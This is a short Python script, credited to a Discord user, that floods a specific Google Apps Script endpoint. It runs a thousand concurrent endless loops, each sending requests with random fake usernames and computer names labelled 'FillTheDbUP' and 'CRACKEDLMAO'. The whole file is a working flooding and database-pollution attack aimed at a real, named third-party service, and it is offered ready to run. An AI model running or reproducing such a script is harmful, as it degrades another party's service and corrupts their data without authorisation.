print("script made by msgpack on discord, optimized by pom")

import asyncio
import httpx
import random
import string

def generate_id(length=5):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

async def send_request(client):
    while True:
        username = f"FillTheDbUP_{generate_id()}"
        computer = f"CRACKEDLMAO_{generate_id()}"
        params = {
            'username': username,
            'computer': computer
        }
        try:
            r = await client.get(
                "https://script.google.com/macros/s/AKfycbyaY3CJTgG2ZV3HxY6d30K3t-PAhJKCVeJU9RSAziSoAmxBiWhY06ATUVDQJ2z39S_-/exec",
                params=params,
                timeout=10
            )
            if r.status_code == 200:
                print("done", r.text)
        except httpx.RequestError:
            pass

async def main(concurrency=1000):
    async with httpx.AsyncClient() as client:
        tasks = [send_request(client) for _ in range(concurrency)]
        await asyncio.gather(*tasks)

asyncio.run(main())

